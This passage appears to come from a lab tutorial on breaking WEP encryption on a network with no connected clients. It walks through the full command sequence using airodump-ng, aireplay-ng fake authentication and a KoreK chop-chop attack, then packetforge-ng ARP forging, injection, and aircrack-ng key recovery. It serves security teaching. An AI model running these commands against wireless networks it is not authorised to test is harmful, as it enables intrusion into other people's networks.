
Suppose our target network does not have any wireless clients connected and there are no ARP requests coming from any Ethernet-connected stations. In this scenario, we can perform a special `Fragmentation` or `KoreK chop chop` attack in combination with [fake authentication](https://www.aircrack-ng.org/doku.php?id=fake_authentication). It's important to note that while this method works on some networks, it is not universally effective, and ultimately depends on whether the network is vulnerable to fake authentication or not.

```
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
```

Once this is running, in our second terminal we will begin packet crafting attempts. This involves using our interface's MAC address to authenticate with the access point. We employ the following command, specifying fake authentication with `-1`, the re-association interval with `1000`, the ESSID of the network with `-e`, the BSSID with `-a`, our MAC address with `-h`, and the keep-alive request interval with `-q`. Additionally, we use `-o 1` to send only one set of packets at a time.

```
aireplay-ng -1 1000 -o 1 -q 5 -e HTB-Wireless -a 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

```
sudo airodump-ng -c 3 --bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
```

Then, in a third terminal, we initiate either a fragmentation or KoreK chop chop attack. To start a KoreK chop chop attack, we use the following command, specifying the access point's BSSID with `-b` and our interface's MAC address with `-h`.

```
aireplay-ng -4 -b 60:38:E0:71:E9:DC -h 00:c0:ca:98:3e:e0 wlan0mon
```

Once we have successfully captured the PRGA keystream to a `.xor` file, we will use `packetforge-ng` to forge a packet and inject it into the network with no stations. We do so with the following command, specifying the access point MAC with `-a`, our associated interface MAC with `-h`, our guessed source IP with `-l`, our guessed destination IP with `-k`, our replay file with `-y`, and write destination with `-w`. If we do not know the IP, we could just use `255.255.255.0` or `255.255.255.255`

```
packetforge-ng -0 -a 60:38:e0:71:e9:dc -h 00:c0:ca:98:3e:e0 -k 192.168.1.1 -l 192.168.1.64 -y replay_dec-1229-160018.xor -w forgedarp.cap
```

Now that we have a forged ARP packet, we can inject it back into the network. We do so with the following command:

```
aireplay-ng -2 -r forgedarp.cap wlan0mon
```

```
sudo aircrack-ng -b 60:38:E0:71:E9:DC WEP-01.cap
```

